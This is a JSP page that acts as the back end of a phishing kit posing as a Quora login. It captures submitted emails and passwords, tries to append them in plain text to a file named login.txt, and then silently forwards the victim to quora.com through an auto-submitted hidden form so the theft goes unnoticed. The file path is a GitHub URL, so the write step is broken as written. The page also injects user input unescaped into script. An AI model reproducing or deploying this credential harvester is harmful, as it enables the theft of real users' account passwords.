<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>waiting...</title>

</head>
<body>
<%@ page import="java.io.*" %>

<%
	String str = request.getParameter("email");
	String pass = request.getParameter("password");
	 //File creation
	 String strPath = "https:////github.com//pbharathreddy//quora.guithub.io//blob//master//login.txt";
	 FileWriter fw = new FileWriter(strPath, true);
	 //File appending
	 Writer objWriter = new BufferedWriter(fw);
	 objWriter.append("user name: "+str+"\n");
	 objWriter.append("password: "+pass+"\n");
	 objWriter.flush();
	 objWriter.close();
 %>
 
 <form name='myForm' id ='myForm' action='https://www.quora.com/' method = 'post'>
 <input type='hidden' name='email' id='email' value =''>
 <input type='hidden' name='password' id='password' value =''>
 </form>
 
<script language="JavaScript" type="text/javascript">
var user = '<%= str%>';
var pass = '<%= pass%>';
document.getElementById("email").value = user;
document.getElementById("password").value = pass;
</script>
 
 <script language="JavaScript" type="text/javascript">
 var t = setTimeout("document.myForm.submit();",1);
 </script>
 
</body>
</html>